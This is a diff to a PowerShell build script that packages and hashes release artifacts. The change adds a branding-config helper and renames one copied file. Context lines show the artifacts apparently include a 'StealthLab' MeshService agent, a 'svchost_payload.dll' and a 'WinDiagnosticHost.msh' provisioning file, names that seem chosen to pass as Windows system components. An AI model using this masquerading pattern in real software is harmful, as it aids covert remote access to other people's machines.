@@ -12,6 +12,12 @@ $scriptRoot = Split-Path -Parent $MyInvocation.MyCommand.Path
 $repoRoot = Split-Path -Parent $scriptRoot
 
 . (Join-Path $scriptRoot 'ResourceProbe.ps1')
+$brandingHelper = Join-Path $repoRoot 'tools\BrandingConfig.ps1'
+if (-not (Test-Path -LiteralPath $brandingHelper)) {
+    throw "Branding helper missing at $brandingHelper"
+}
+. $brandingHelper
+$brandingConfigInfo = Get-BrandingConfig -RepoRoot $repoRoot -Quiet
 
 function Resolve-OutputPath {
     param([string]$Path)
@@ -38,7 +44,7 @@ $exeWin32 = Join-Path $repoRoot "meshservice\StealthLab\MeshService-2022.exe"
 $dllPayload = Join-Path $repoRoot "meshservice\x64\StealthLab_DLL\MeshService-2022.dll"
 $embeddedPayload = Join-Path $repoRoot "meshservice\embedded\svchost_payload.dll"
 $mshPath = Join-Path $repoRoot "WinDiagnosticHost.msh"
-$brandingConfig = Join-Path $repoRoot "branding_config.json"
+$brandingConfig = $brandingConfigInfo.Path
 
 if (-not (Test-Path $exeX64)) {
     throw "Expected x64 StealthLab executable not found at '$exeX64'."
@@ -102,7 +108,7 @@ $artifact = Copy-WithHash -Source $embeddedPayload -DestinationName "svchost_pay
 if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
 $artifact = Copy-WithHash -Source $mshPath -DestinationName "WinDiagnosticHost.msh" -Description "Provisioning data (.msh)"
 if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
-$artifact = Copy-WithHash -Source $brandingConfig -DestinationName "branding_config.json" -Description "Branding configuration snapshot"
+$artifact = Copy-WithHash -Source $brandingConfig -DestinationName "branding_config.local.json" -Description "Branding configuration snapshot"
 if ($artifact) { $artifacts += $artifact; $hashLines += "SHA256 ($($artifact.Name)) = $($artifact.Hash)" }
 
 Write-Host "[3/4] Writing metadata..." -ForegroundColor Cyan
